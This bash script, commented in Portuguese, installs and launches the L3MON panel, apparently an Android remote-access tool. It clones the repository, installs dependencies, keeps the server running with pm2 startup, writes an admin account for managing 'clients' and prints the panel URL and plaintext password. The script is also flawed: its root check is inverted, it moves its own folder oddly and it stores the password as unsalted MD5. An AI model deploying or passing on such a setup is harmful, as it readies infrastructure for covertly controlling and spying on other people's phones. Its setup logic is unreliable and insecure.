#!/bin/bash

# Verifica se o usuário é root (ID 0) ou não
if [ "$(id -u)" -eq 0 ]; then
    # O usuário é root, definimos algumas variáveis para os comandos
    INSTALL_CMD="sudo apt install"
    NODE_CMD="sudo npm"
    PM2_CMD="sudo pm2"
else
    # O usuário não é root, definimos algumas variáveis para os comandos
    INSTALL_CMD="apt install"
    NODE_CMD="npm"
    PM2_CMD="pm2"
fi

# Verifica se o diretório do repositório já existe; se não, clona o repositório
if [ ! -d "L3MON" ]; then
    git clone https://github.com/efxtv/L3MON.git
fi

# Move o script para dentro do diretório do repositório
SCRIPT_DIR=$(cd "$(dirname "$0")" && pwd)
mv "$SCRIPT_DIR" L3MON

# Acessa o diretório do repositório clonado
cd L3MON

# Instala as dependências
$INSTALL_CMD wget curl git npm nano nodejs openjdk-8-jdk openjdk-8-jre

# Instala dependências adicionais e inicia o aplicativo
$NODE_CMD install
$NODE_CMD audit fix
$NODE_CMD audit
$NODE_CMD install
$PM2_CMD start index.js
$PM2_CMD startup

# Obtém o nome de usuário do usuário
echo "Digite o nome de usuário (username):"
read username

# Obtém a senha do usuário para gerar a hash MD5
echo "Digite a senha:"
read -s senha
md5hash=$(echo -n "$senha" | openssl md5 | awk '{print $2}')

# Cria o arquivo maindb.json
cat > maindb.json <<EOF
{
  "admin": {
    "username": "$username",
    "password": "$md5hash",
    "loginToken": "",
    "logs": [],
    "ipLog": []
  },
  "clients": []
}
EOF

# Obtém o IP do sistema
ip=$(hostname -I | awk '{print $1}')

# Gera o link
link="http://$ip:22533"

echo "Link gerado: $link"
echo "Credenciais: User:$username Pass:$senha"
